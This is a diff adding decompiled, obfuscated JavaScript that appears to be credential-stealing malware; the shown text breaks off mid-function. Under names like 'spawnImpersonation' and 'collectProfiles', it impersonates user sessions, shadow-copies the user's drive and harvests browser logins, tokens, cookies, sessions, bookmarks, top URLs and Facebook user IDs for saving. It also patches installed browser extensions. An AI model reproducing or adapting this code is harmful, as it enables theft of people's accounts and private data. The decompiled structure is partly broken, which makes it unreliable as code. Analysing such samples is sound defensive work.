@@ -1,0 +1,1779 @@
+function func_settleAll_0x10000b836()
+{
+	r0 = Promise["all"]
+	r3 = new [0, 0]
+	r4 = (func_workerPool_0x100006759(func_spawnImpersonation_0x10000a9a5))["withEverySession"]
+	r3[0] = r4(func_collectProfiles_0x100000662)
+	r3[1] = func_settleAll_0x1000006ea(false)
+	return r0(r3)
+}
+function func_spawnImpersonation_0x10000a9a5(a0)
+{
+	return func_spawnWorker_0x100000005(("security-impersonation"), a0)
+}
+function func_workerPool_0x100006759(a0)
+{
+	r1 = <closure>
+	ACCU = <closure>
+	ACCU = r0
+	r6 = supper(r0)
+	ACCU = <this>
+	<this> = r6
+	ACCU = <this>
+	<this>["createWorker"] = a0
+	ACCU = <this>
+	<this>["pool"] = Map(r0)
+	ACCU = <this>
+	ACCU = <this>
+	r6 = <this>["rebuildWorkers"]["bind"]
+	ACCU = <this>
+	<this>["rebuildWorkers"] = r6(<this>)
+	ACCU = <this>
+	r7 = <this>["rebuildWorkers"]
+	ACCU = global_OV["on"]("sessions", r7)
+	return <this>
+}
+function func_settleAll_0x1000006ea(a0)
+{
+	Scope[10730][2] = a0
+	r6 = <closure>
+	r7 = <this>
+	r0 = a0
+	ACCU = func_u_0x1000006e7
+	try
+	{
+		r4 = func_filterSid_0x10000055f()
+		r7 = Promise["allSettled"]
+		r9 = r4["map"]
+		r9 = r9(func_enqueue_0x1000006e9)
+		r8 = r7(r9)
+		r7 = r0
+		r7 = await r8
+		r8 = _GeneratorGetResumeMode(r0)
+		if (!r8 === 0)
+		{
+			ACCU = r7
+		}
+		r8 = undefined
+		r7 = r0
+		ACCU = r8
+		return r8
+	}
+	catch {}
+	r7 = ACCU
+	ACCU = null
+	ACCU = Scope[10731]
+	r8 = r0
+	return Scope[10731][2]
+}
+function func_enqueue_0x1000006e9(a0)
+{
+	return (func_initQueue_0x1000005b2(func_processBrowsers_0x100000686, 1, 1))(a0, Scope[10730][2])
+}
+function func_processBrowsers_0x100000686(a0, a1)
+{
+	Scope[10786][2] = a1
+	r23 = <closure>
+	r24 = <this>
+	r0 = a1
+	Scope[10786][7] = func_a_0x10000067c
+	ACCU = null
+	try
+	{
+		r1 = new {"V": "%r7r", "J": 77960, "S": "]C&)", "g": 46551, "L": "89J2", "X": 27241, "j": "p8sI", "E": 112245, "c": "kh^v", "x": 64708, "K": "A5nh", "u": 123699, "A": "vV[N", "s": 114580, "b": "BS4&", "i": 97064, "w": "A0Dr", "f": 68485, "t": 68310, "P": "F1xf", "I": 9101, "p": "XR6@", "o": 73172, "R": "h98j", "v": 87945, "N": ")Ku4", "M": 83478, "k": "epz[", "Q": 26484, "W": "gm42", "T": 57863, "G": 71906, "y": "vV[N", "e": 8466, "U": 49067, "q": 22993, "O": "A0Dr", "C": 29568, "n": "n@A0", "r": 76107, "H": "I@Bf", "h": 5011, "Y": "h98j", "D": 61365, "l": "pdVE", "a": 94780, "V0": "n@A0", "V1": 95508, "V2": "xQ)2", "V3": 76016, "V6": "K&pk", "VV": 43087, "VJ": "JrBU", "Vz": 35009, "Vd": "93y[", "Vg": 41262, "VL": "pdVE", "Vc": 35307, "Vx": ")Lyh", "VB": 104294, "VK": "pdVE", "Vu": 66192, "VA": "p8sI", "Vs": 22174, "Vb": 16371, "Vw": "mwAz", "Vf": 22326, "Vt": "p[w*", "VP": 82223, "Vp": "O9*f", "Vo": 22047}
+		r2 = func_profilePath_0x100000561(a0)
+		if (!func_profilePath_0x100000561(a0))
+		{
+			r24 = Error
+			r25 = "User profile not found"
+			ACCU = Error
+			ACCU = Error(r25)
+		}
+		r26 = a0["split"]
+		r26 = r26("-")
+		r25 = r26["slice"]
+		r25 = r25(0, -1)
+		r24 = r25["join"]
+		r3 = r24("-")
+		r4 = []
+		r28 = r1["R"]
+		r26 = global_uK["iterBrowsers"]()
+		ACCU = r26[Symbol.asyncIterator]
+		if (!r26[Symbol.asyncIterator] == undefined)
+		{
+			r27 = r26[Symbol.asyncIterator]
+			ACCU = r26[Symbol.asyncIterator]()
+		}
+		r25 = ACCU
+		r24 = r25["next"]
+		ACCU = false
+		r26 = false
+		try
+		{
+			while (true)
+			{
+				r26 = true
+				r32 = r24()
+				r31 = r0
+				r31 = await r32
+				r32 = _GeneratorGetResumeMode(r0)
+				if (!r32 === 0)
+				{
+					ACCU = r31
+				}
+				ACCU = r31
+				r30 = r31
+				if (r30["done"]) break
+				r26 = false
+				r33 = Scope[10786]
+				Scope[10787][2] = r30["value"]
+				r38 = r1["k"]
+				r36 = Scope[10787][2]["iterProfiles"](r2)
+				ACCU = r36[Symbol.asyncIterator]
+				r30 = r30["value"]
+				if (!r36[Symbol.asyncIterator] == undefined)
+				{
+					r37 = r36[Symbol.asyncIterator]
+					ACCU = r36[Symbol.asyncIterator]()
+				}
+				r35 = ACCU
+				r34 = r35["next"]
+				ACCU = false
+				r36 = false
+				r39 = Scope[10787]
+				try
+				{
+					while (true)
+					{
+						r36 = true
+						r42 = r34()
+						r41 = r0
+						r41 = await r42
+						r42 = _GeneratorGetResumeMode(r0)
+						if (!r42 === 0)
+						{
+							ACCU = r41
+						}
+						ACCU = r41
+						r40 = r41
+						if (r40["done"]) break
+						r36 = false
+						r47 = r1["y"]
+						r43 = r40["value"]["iterExtensions"]
+						r45 = r43(r3)
+						ACCU = r45[Symbol.asyncIterator]
+						if (!r45[Symbol.asyncIterator] == undefined)
+						{
+							r46 = r45[Symbol.asyncIterator]
+							ACCU = r45[Symbol.asyncIterator]()
+						}
+						r44 = ACCU
+						r43 = r44["next"]
+						ACCU = false
+						r45 = false
+						try
+						{
+							while (true)
+							{
+								r45 = true
+								r51 = r43()
+								r50 = r0
+								r50 = await r51
+								r51 = _GeneratorGetResumeMode(r0)
+								if (!r51 === 0)
+								{
+									ACCU = r50
+								}
+								ACCU = r50
+								r49 = r50
+								if (r49["done"]) break
+								r45 = false
+								Scope[10788][2] = r49["value"]
+								r49 = r49["value"]
+								r54 = GetIterator(global_zT)
+								r53 = r54["next"]
+								ACCU = false
+								r55 = false
+								try
+								{
+									while (true)
+									{
+										r55 = true
+										r59 = r53()
+										if (r59["done"]) break
+										r55 = false
+										Scope[10789][2] = r59["value"]
+										r62 = Scope[10789][2]["extensions"]
+										r61 = r62["includes"]
+										r59 = r59["value"]
+										if (!r61(Scope[10788][2]["id"])) continue
+										r61 = r4["push"]
+										r63 = func_open_0x100000682()
+										ACCU = r61(r63)
+									}
+									ACCU = -1
+									r57 = -1
+									r56 = -1
+								}
+								catch
+								{
+									r57 = ACCU
+									r56 = 0
+								}
+								if (!r55)
+								{
+									try
+									{
+										if (!r54["return"] == undefined)
+										{
+											ACCU = r54["return"]()
+										}
+										catch {}
+									}
+								}
+								ACCU = null
+								if (!r56 === 0) continue
+								ACCU = 0
+								r46 = 0
+								r47 = r57
+								break
+							}
+							ACCU = -1
+							r47 = -1
+							r46 = -1
+						}
+						catch
+						{
+							r47 = ACCU
+							r46 = 0
+						}
+						if (!r45)
+						{
+							try
+							{
+								if (!r44["return"] == undefined)
+								{
+									r56 = r44["return"]()
+									r55 = r0
+									r55 = await r56
+									r56 = _GeneratorGetResumeMode(r0)
+									if (!r56 === 0)
+									{
+										ACCU = r55
+									}
+									ACCU = r55
+								}
+								catch {}
+							}
+						}
+						ACCU = null
+						if (!r46 === 0) continue
+						ACCU = 0
+						r37 = 0
+						r38 = r47
+						break
+					}
+					ACCU = -1
+					r38 = -1
+					r37 = -1
+				}
+				catch
+				{
+					r38 = ACCU
+					r37 = 0
+				}
+				if (!r36)
+				{
+					try
+					{
+						if (!r35["return"] == undefined)
+						{
+							r46 = r35["return"]()
+							r45 = r0
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(r0)
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							ACCU = r45
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (!r37 === 0) continue
+				ACCU = 0
+				r27 = 0
+				r28 = r38
+				break
+			}
+			ACCU = -1
+			r28 = -1
+			r27 = -1
+		}
+		catch
+		{
+			r28 = ACCU
+			r27 = 0
+		}
+		if (!r26)
+		{
+			try
+			{
+				if (!r25["return"] == undefined)
+				{
+					r37 = r25["return"]()
+					r36 = r0
+					r36 = await r37
+					r37 = _GeneratorGetResumeMode(r0)
+					if (!r37 === 0)
+					{
+						ACCU = r36
+					}
+					ACCU = r36
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r27 === 0)
+		{
+			ACCU = r28
+		}
+		r25 = Promise["all"]
+		r26 = r25(r4)
+		r25 = r0
+		r25 = await r26
+		r26 = _GeneratorGetResumeMode(r0)
+		if (!r26 === 0)
+		{
+			ACCU = r25
+		}
+		r27 = r1["V0"]
+		r28 = r1["V1"]
+		r24 = r25["filter"]
+		Scope[10786][8] = r24(func_truthy_0x100000683)
+		r9 = func_queue_0x10000a92f(r0)
+		r25 = GetIterator(Scope[10786][8])
+		r24 = r25["next"]
+		ACCU = false
+		r26 = false
+		try
+		{
+			while (true)
+			{
+				r26 = true
+				r30 = r24()
+				if (r30["done"]) break
+				r26 = false
+				Scope[10790][2] = r30["value"]["browser"]
+				Scope[10790][3] = r30["value"]["extension"]
+				Scope[10790][4] = r30["value"]["result"]
+				Scope[10790][5] = r30["value"]["processor"]
+				ACCU = Scope[10790][3]["originalId"]
+				r30 = r30["value"]
+				if (Scope[10790][3]["originalId"])
+				{
+					ACCU = "push"
+				}
+				else
+				{
+					ACCU = "unshift"
+				}
+				r15 = ACCU
+				r34 = r9["add"]
+				r35 = r9
+				r38 = r15
+				r34 = r34(Scope[10790][3]["id"], func_patch_0x100000684, r38)
+				r33 = r34["then"]
+				r33 = r33(func_push_0x100000685)
+				r32 = r33["catch"]
+				r37 = new {"application": null, "type": null}
+				r37["application"] = Scope[10790][2]["application"]
+				r37["type"] = Scope[10790][5]["type"]
+				r34 = func_abortError_0x100000144(r37)
+				ACCU = r32(r34)
+			}
+			ACCU = -1
+			r28 = -1
+			r27 = -1
+		}
+		catch
+		{
+			r28 = ACCU
+			r27 = 0
+		}
+		if (!r26)
+		{
+			try
+			{
+				if (!r25["return"] == undefined)
+				{
+					ACCU = r25["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r27 === 0)
+		{
+			ACCU = r28
+		}
+		r24 = r9["process"]
+		r25 = r24()
+		r24 = r0
+		r24 = await r25
+		r25 = _GeneratorGetResumeMode(r0)
+		if (!r25 === 0)
+		{
+			ACCU = r24
+		}
+		r25 = undefined
+		r24 = r0
+		ACCU = r25
+		return r25
+	}
+	catch {}
+	r24 = ACCU
+	ACCU = null
+	ACCU = Scope[10791]
+	r25 = r0
+	return Scope[10791][2]
+}
+function func_equals_0x100000666(a0, a1)
+{
+	ACCU = a0 == null
+	if (a0 == null)
+	{
+		ACCU = true
+	}
+	else
+	{
+		ACCU = a0 === a1
+	}
+	return ACCU
+}
+function func_collectProfiles_0x100000662(a0, a1)
+{
+	r25 = <closure>
+	r26 = <this>
+	ACCU = func_x_0x100000657
+	try
+	{
+		r1 = new {"V": "]1@2", "J": 94473, "S": "iSZ6", "g": 16390, "L": 89082, "X": "89J2", "j": 6028, "E": ")Lyh", "c": 55516, "x": "p[w*", "K": 56564, "u": "vV[N", "A": 44144, "s": "xQ)2", "b": 51697, "i": "x&b0", "w": 23949, "f": 45559, "t": "%r7r", "P": 91438, "I": "JrBU", "p": 1896, "o": 90587, "R": "pdVE", "v": 35777, "N": "epz[", "M": 71425, "k": "^Ceg", "Q": 65067, "W": "]C&)", "T": 30132, "G": "vV[N", "y": 104676, "e": "[()[", "U": 46125, "q": "toM2", "O": 62771, "C": "I@Bf", "n": 111612, "r": 60014, "H": "*!!t", "h": 51213, "Y": "C0qY", "D": 20034, "l": "[Jy3", "a": 91654, "V0": "BS4&", "V1": 71298, "V2": 17173, "V3": "Yx9u", "V6": 63951, "VV": "h98j", "VJ": 80708, "Vz": "n@A0", "Vd": 114995, "Vg": ")Ku4", "VL": 29714, "Vc": "A5nh", "Vx": 15778, "VB": 89390, "VK": "O9*f", "Vu": 105968, "VA": "M2Ty", "Vs": 33876, "Vb": "gm42", "Vw": 123437, "Vf": "b48I", "Vt": 125282, "VP": 54333, "Vp": "M2Ty", "Vo": 119771, "VR": "m[K#", "VQ": 91758, "VW": "A0Dr", "VT": 120496, "VG": "%]hf", "Vy": 84647, "Ve": "]1@2", "VU": 109819, "Vq": "eeST", "VO": 39345, "Vm": "8dGo", "VZ": 59561, "Vn": "]C&)", "Vr": 14854, "VH": "VHeU", "Vh": 13076, "VY": "[Jy3", "VD": 106131, "Vl": "F1xf", "Va": 100561}
+		r3 = a0["info"]["sid"]
+		ACCU = a1
+		r29 = a1
+		r27 = r2
+		if (!a1 == undefined)
+		{
+			ACCU = r29["user"]
+		}
+		else
+		{
+			ACCU = undefined
+		}
+		r29 = ACCU
+		if (!func_equals_0x100000666(r29, r3))
+		{
+			return false
+		}
+		r27 = a0["rpc"]["getUserDirectory"]
+		r26 = r27["query"]
+		r27 = r26()
+		r26 = await r27
+		r27 = _GeneratorGetResumeMode(Scope[10811])
+		if (!r27 === 0)
+		{
+			ACCU = r26
+		}
+		r4 = r26
+		r26 = (require("path"))["parse"]
+		r26 = r26(r4)
+		r5 = r26["root"]
+		r30 = r1["I"]
+		r27 = global_Lz["createShadowCopy"](r5)
+		r26 = await r27
+		r27 = _GeneratorGetResumeMode(Scope[10811])
+		if (!r27 === 0)
+		{
+			ACCU = r26
+		}
+		ACCU = r26["dispose"]
+		r7 = r26["dispose"]
+		try
+		{
+			r30 = r2
+			r11 = func_relpath_0x100000524(r4, r5, r26["path"])
+			r32 = r1["N"]
+			r33 = r1["k"]
+			r31 = global_Oz["iterBrowsers"]()
+			r30 = GetIterator(r31)
+			r29 = r30["next"]
+			ACCU = false
+			r31 = false
+			try
+			{
+				while (true)
+				{
+					r31 = true
+					r35 = r29()
+					if (r35["done"]) break
+					r31 = false
+					r13 = r35["value"]
+					ACCU = a1
+					r39 = a1
+					r37 = r2
+					if (!a1 == undefined)
+					{
+						ACCU = r39["application"]
+					}
+					else
+					{
+						ACCU = undefined
+					}
+					r39 = ACCU
+					r43 = r1["C"]
+					if (!func_equals_0x100000666(r39, r35["value"]["application"])) continue
+					r40 = r1["H"]
+					r39 = a0["id"]
+					r38 = r35["value"]["iterProfiles"](r11, a0["id"])
+					ACCU = r38[Symbol.asyncIterator]
+					if (!r38[Symbol.asyncIterator] == undefined)
+					{
+						r39 = r38[Symbol.asyncIterator]
+						ACCU = r38[Symbol.asyncIterator]()
+					}
+					r37 = ACCU
+					r36 = r37["next"]
+					ACCU = false
+					r38 = false
+					try
+					{
+						while (true)
+						{
+							r38 = true
+							r44 = r36()
+							r43 = await r44
+							r44 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r44 === 0)
+							{
+								ACCU = r43
+							}
+							ACCU = r43
+							r42 = r43
+							if (r42["done"]) break
+							r38 = false
+							r15 = r42["value"]
+							r48 = r42["value"]["path"]
+							r46 = r2
+							r49 = r11
+							r50 = r4
+							r17 = func_relpath_0x100000524(r48, r49, r50)
+							r42 = r42["value"]
+							ACCU = a1
+							r48 = a1
+							r46 = r2
+							if (!a1 == undefined)
+							{
+								ACCU = r48["profile"]
+							}
+							else
+							{
+								ACCU = undefined
+							}
+							r48 = ACCU
+							r49 = r17
+							if (!func_equals_0x100000666(r48, r49))
+							{
+								continue
+							}
+							r46 = func_collectLogins_0x10000062d(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r46 = func_iterateTokens_0x100000632(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r45 = r15["getExpiryDate"]
+							r18 = r45()
+							r48 = Date(Scope[10811])
+							if (r18 < r48)
+							{
+								continue
+							}
+							r46 = func_extensions_0x100000634(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r19 = r45
+							r47 = r2
+							r49 = r15
+							r46 = func_topUrls_0x10000063c(r49, 15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r20 = r45
+							r47 = r2
+							r49 = r15
+							r46 = func_collectBookmarks_0x100000641(r49, 15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r21 = r45
+							r46 = func_Cookies_0x100000653(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r22 = r45
+							r46 = func_collectSessions_0x100000656(r15)
+							r45 = r46["catch"]
+							r46 = r45(func_noop_0x1000004cf)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							r23 = r45
+							r49 = new {"application": null, "user": null, "path": null, "extensions": null, "topOrigins": null, "topBookmarks": null, "cookies": null, "sessions": null, "expiresAt": null}
+							r49["application"] = r13["application"]
+							r49["user"] = r3
+							r49["path"] = r17
+							r49["extensions"] = r19
+							r49["topOrigins"] = r20
+							r49["topBookmarks"] = r21
+							r49["cookies"] = r22
+							r49["sessions"] = r23
+							r49["expiresAt"] = r18
+							r46 = func_saveProfile_0x1000005df(r49)
+							r45 = r46["catch"]
+							r50 = new {"application": null, "user": null, "path": null}
+							r50["application"] = r13["application"]
+							r50["user"] = r3
+							r50["path"] = r17
+							r47 = func_abortError_0x100000144(r50)
+							r46 = r45(r47)
+							r45 = await r46
+							r46 = _GeneratorGetResumeMode(Scope[10811])
+							if (!r46 === 0)
+							{
+								ACCU = r45
+							}
+							if (!a1) continue
+							r40 = true
+							ACCU = 1
+							r39 = 1
+							break
+						}
+						ACCU = -1
+						r40 = -1
+						r39 = -1
+					}
+					catch
+					{
+						r40 = ACCU
+						r39 = 0
+					}
+					if (!r38)
+					{
+						try
+						{
+							if (!r37["return"] == undefined)
+							{
+								r48 = r37["return"]()
+								r47 = await r48
+								r48 = _GeneratorGetResumeMode(Scope[10811])
+								if (!r48 === 0)
+								{
+									ACCU = r47
+								}
+								ACCU = r47
+							}
+							catch {}
+						}
+					}
+					ACCU = null
+					switch (r39)
+					default:
+					{
+						continue
+					}
+					case (0):
+					{
+						r32 = 0
+						r33 = r40
+						break
+					}
+					case (1):
+					{}
+					ACCU = 1
+					r32 = 1
+					r33 = r40
+					break
+				}
+				ACCU = -1
+				r33 = -1
+				r32 = -1
+			}
+			catch
+			{
+				r33 = ACCU
+				r32 = 0
+			}
+			if (!r31)
+			{
+				try
+				{
+					if (!r30["return"] == undefined)
+					{
+						ACCU = r30["return"]()
+					}
+					catch {}
+				}
+			}
+			ACCU = null
+			ACCU = r32
+			switch (r32)
+			default:
+			{
+				break
+			}
+			case (0):
+			{
+				r26 = 0
+				r27 = r33
+				break
+			}
+			case (1):
+			{
+				r26 = 1
+				r27 = r33
+			}
+			default:
+			{
+				break
+				r27 = -1
+				r26 = -1
+			}
+		}
+		catch
+		{
+			r27 = ACCU
+			r26 = 0
+		}
+		ACCU = r7()
+		ACCU = null
+		switch (r26)
+		default:
+		{
+			break
+		}
+		case (0):
+		{
+			ACCU = r27
+		}
+		case (1):
+		{
+			return r27
+		}
+		r27 = !Boolean(a1)
+		ACCU = r27
+		return r27
+	}
+	catch {}
+	r26 = ACCU
+	ACCU = null
+	ACCU = Scope[10812]
+	return Scope[10812][2]
+}
+function func_collectSessions_0x100000656(a0)
+{
+	r7 = a0["iterSessions"]
+	r7 = r7()
+	return func_collectAsync_0x1000004d1(r7)
+}
+function func_Cookies_0x100000653(a0)
+{
+	r6 = <closure>
+	r7 = <this>
+	ACCU = func_u_0x100000650
+	try
+	{
+		r10 = a0["iterCookies"]
+		r10 = r10()
+		r8 = func_collectAsync_0x1000004d1(r10)
+		r7 = await r8
+		r8 = _GeneratorGetResumeMode(Scope[10814])
+		if (!r8 === 0)
+		{
+			ACCU = r7
+		}
+		r4 = r7
+		r8 = func_facebookProfiles_0x100000649(r4)
+		r7 = r8["catch"]
+		r8 = r7(func_noop_0x1000004cf)
+		r7 = await r8
+		r8 = _GeneratorGetResumeMode(Scope[10814])
+		if (!r8 === 0)
+		{
+			ACCU = r7
+		}
+		r8 = r4
+		ACCU = r8
+		return r8
+	}
+	catch {}
+	r7 = ACCU
+	ACCU = null
+	ACCU = Scope[10815]
+	return Scope[10815][2]
+}
+function func_facebookProfiles_0x100000649(a0)
+{
+	r8 = <closure>
+	r9 = <this>
+	ACCU = func_r_0x100000645
+	Scope[10817][3] = func_r_0x100000645
+	try
+	{
+		r1 = new {"V": "h^gm", "J": 80043, "S": "pdVE", "g": 2598, "L": "B@Sb", "X": 63774, "j": "I@Bf", "E": 59790, "c": "[Jy3", "x": 50939}
+		r13 = func_facebook_0x10000064f(a0)
+		r11 = r2
+		r11 = func_collectAsync_0x1000004d1(r13, true)
+		r9 = r2
+		r10 = await r11
+		r11 = _GeneratorGetResumeMode(Scope[10817])
+		if (!r11 === 0)
+		{
+			ACCU = r10
+		}
+		r12 = r1["L"]
+		r13 = r1["X"]
+		r9 = r10["filter"]
+		r3 = r9(func_isDigits_0x100000648)
+		r10 = GetIterator(r3)
+		r9 = r10["next"]
+		ACCU = false
+		r11 = false
+		try
+		{
+			while (true)
+			{
+				r11 = true
+				r15 = r9()
+				if (r15["done"]) break
+				r11 = false
+				r20 = new {"userId": null}
+				r20["userId"] = r15["value"]
+				r17 = func_saveFacebookProfile_0x1000005eb(r20)
+				r16 = r17["catch"]
+				r17 = r16(func_noop_0x1000004cf)
+				r15 = r15["value"]
+				r16 = await r17
+				r17 = _GeneratorGetResumeMode(Scope[10817])
+				if (r17 === 0) continue
+				ACCU = r16
+				ACCU = r16
+			}
+			ACCU = -1
+			r13 = -1
+			r12 = -1
+		}
+		catch
+		{
+			r13 = ACCU
+			r12 = 0
+		}
+		if (!r11)
+		{
+			try
+			{
+				if (!r10["return"] == undefined)
+				{
+					ACCU = r10["return"]()
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r12 === 0)
+		{
+			ACCU = r13
+		}
+		r10 = undefined
+		ACCU = r10
+		return r10
+	}
+	catch {}
+	r9 = ACCU
+	ACCU = null
+	ACCU = Scope[10818]
+	return Scope[10818][2]
+}
+function func_collectBookmarks_0x100000641(a0, a1)
+{
+	r12 = <closure>
+	r13 = <this>
+	ACCU = func_u_0x10000063d
+	Scope[10820][3] = func_u_0x10000063d
+	try
+	{
+		r1 = new {"V": 22939, "J": "Yx9u", "S": 81622, "g": "%]hf", "L": 47308, "X": "A5nh", "j": 117611, "E": "F1xf", "c": 44579, "x": "]1@2", "K": 47276, "u": "xQ)2", "A": 36663, "s": "8dGo", "b": 95152, "i": "iSZ6", "w": 72936, "f": "epz[", "t": 86436, "P": "K&pk", "I": 68992, "p": "epz[", "o": 95359, "R": "I@Bf", "v": 16223, "N": "h^gm", "M": 16143, "k": "b48I"}
+		r3 = {}
+		r17 = r1["L"]
+		r13 = a0["iterBookmarks"]
+		r15 = r13()
+		ACCU = r15[Symbol.asyncIterator]
+		if (!r15[Symbol.asyncIterator] == undefined)
+		{
+			r16 = r15[Symbol.asyncIterator]
+			ACCU = r15[Symbol.asyncIterator]()
+		}
+		r14 = ACCU
+		r13 = r14["next"]
+		ACCU = false
+		r15 = false
+		r18 = Scope[10820]
+		try
+		{
+			while (true)
+			{
+				r15 = true
+				r21 = r13()
+				r20 = await r21
+				r21 = _GeneratorGetResumeMode(Scope[10820])
+				if (!r21 === 0)
+				{
+					ACCU = r20
+				}
+				ACCU = r20
+				r19 = r20
+				if (r19["done"]) break
+				r15 = false
+				if (!r19["value"]["lastVisitedAt"])
+				{
+					continue
+				}
+				r27 = r1["E"]
+				r23 = r19["value"]["url"]["trim"]
+				r23 = r23()
+				r26 = r1["x"]
+				r22 = r23["split"]
+				r22 = r22("?")
+				r24 = GetIterator(r22)
+				ACCU = false
+				r25 = false
+				try
+				{
+					if (!false)
+					r25 = true
+					r29 = r24["next"]()
+					ACCU = r29["done"]
+						&& (!r29["done"])
+					{
+						r25 = false
+						ACCU = r29["value"]
+					}
+					else
+					{
+						ACCU = undefined
+					}
+					r9 = ACCU
+					ACCU = -1
+					r27 = -1
+					r26 = -1
+				}
+				catch
+				{
+					r27 = ACCU
+					r26 = 0
+				}
+				if (!r25)
+				{
+					try
+					{
+						if (!r24["return"] == undefined)
+						{
+							ACCU = r24["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (r26 === 0)
+				{
+					r16 = 0
+					r17 = r27
+					break
+				}
+				r24 = r9["length"]
+				if (r24 > 256)
+				{
+					continue
+				}
+				r22 = Math["max"]
+				ACCU = r3[r9]
+				r25 = r3[r9]
+				if (!r3[r9] == undefined)
+				{
+					r24 = r25["getTime"]
+					ACCU = r24()
+				}
+				else
+				{
+					ACCU = undefined
+				}
+				if (!ACCU)
+				{
+					ACCU = 0
+				}
+				r24 = ACCU
+				r25 = r19["value"]["lastVisitedAt"]["getTime"]()
+				r10 = r22(r24, r25)
+				ACCU = Date
+				ACCU = Date(r10)
+				r3[r9] = Date(r10)
+			}
+			ACCU = -1
+			r17 = -1
+			r16 = -1
+		}
+		catch
+		{
+			r17 = ACCU
+			r16 = 0
+		}
+		if (!r15)
+		{
+			try
+			{
+				if (!r14["return"] == undefined)
+				{
+					r25 = r14["return"]()
+					r24 = await r25
+					r25 = _GeneratorGetResumeMode(Scope[10820])
+					if (!r25 === 0)
+					{
+						ACCU = r24
+					}
+					ACCU = r24
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r16 === 0)
+		{
+			ACCU = r17
+		}
+		r16 = Object["entries"](r3)
+		r15 = r16["sort"]
+		r15 = r15(func_dateDiff_0x10000063f)
+		r14 = r15["slice"]
+		r14 = r14(0, a1)
+		r13 = r14["map"]
+		r14 = r13(func_first_0x100000640)
+		ACCU = r14
+		return r14
+	}
+	catch {}
+	r13 = ACCU
+	ACCU = null
+	ACCU = Scope[10821]
+	return Scope[10821][2]
+}
+function func_first_0x100000640(a0)
+{
+	return a0[0]
+}
+function func_dateDiff_0x10000063f(a0, a1)
+{
+	r0 = a1[1]["getTime"]
+	r0 = r0()
+	r1 = a0[1]["getTime"]
+	return (r0 - r1())
+}
+function func_topUrls_0x10000063c(a0, a1)
+{
+	r12 = <closure>
+	r13 = <this>
+	ACCU = func_o_0x100000637
+	try
+	{
+		r1 = new {"V": 49691, "J": "vV[N", "S": 43200, "g": "K&pk", "L": 54118, "X": "89J2", "j": 21708, "E": "%r7r", "c": 93222, "x": "JrBU", "K": 24612, "u": "C0qY", "A": 83316, "s": "[()[", "b": 12098, "i": "A5nh", "w": 112814, "f": "^Ceg", "t": 32434, "P": "8dGo"}
+		r3 = {}
+		r16 = r1["V"]
+		r17 = r1["L"]
+		r13 = a0["iterHistoryURLs"]
+		r15 = r13()
+		ACCU = r15[Symbol.asyncIterator]
+		if (!r15[Symbol.asyncIterator] == undefined)
+		{
+			r16 = r15[Symbol.asyncIterator]
+			ACCU = r15[Symbol.asyncIterator]()
+		}
+		r14 = ACCU
+		r13 = r14["next"]
+		ACCU = false
+		r15 = false
+		r18 = Scope[10822]
+		try
+		{
+			while (true)
+			{
+				r15 = true
+				r21 = r13()
+				r20 = await r21
+				r21 = _GeneratorGetResumeMode(Scope[10822])
+				if (!r21 === 0)
+				{
+					ACCU = r20
+				}
+				ACCU = r20
+				r19 = r20
+				if (r19["done"]) break
+				r15 = false
+				r10 = func_normalizeUrl_0x1000002a3(r19["value"]["url"])
+				r24 = r10["length"]
+				if (r24 > 64) continue
+				r22 = r3
+				r23 = r10
+				if (!r3[r10] == undefined)
+				{
+					r22[r23] = 0
+				}
+				r24 = r3[r10]
+				r25 = (r24 + r19["value"]["visits"])
+				r3[r10] = (r24 + r19["value"]["visits"])
+				ACCU = r25
+			}
+			ACCU = -1
+			r17 = -1
+			r16 = -1
+		}
+		catch
+		{
+			r17 = ACCU
+			r16 = 0
+		}
+		if (!r15)
+		{
+			try
+			{
+				if (!r14["return"] == undefined)
+				{
+					r25 = r14["return"]()
+					r24 = await r25
+					r25 = _GeneratorGetResumeMode(Scope[10822])
+					if (!r25 === 0)
+					{
+						ACCU = r24
+					}
+					ACCU = r24
+				}
+				catch {}
+			}
+		}
+		ACCU = null
+		if (r16 === 0)
+		{
+			ACCU = r17
+		}
+		r16 = Object["entries"](r3)
+		r15 = r16["sort"]
+		r15 = r15(func_compare_0x10000063a)
+		r14 = r15["slice"]
+		r14 = r14(0, a1)
+		r13 = r14["map"]
+		r14 = r13(func_head_0x10000063b)
+		ACCU = r14
+		return r14
+	}
+	catch {}
+	r13 = ACCU
+	ACCU = null
+	ACCU = Scope[10823]
+	return Scope[10823][2]
+}
+function func_head_0x10000063b(a0)
+{
+	return a0[0]
+}
+function func_compare_0x10000063a(a0, a1)
+{
+	return (a1[1] - a0[1])
+}
+function func_extensions_0x100000634(a0)
+{
+	r8 = <closure>
+	r9 = <this>
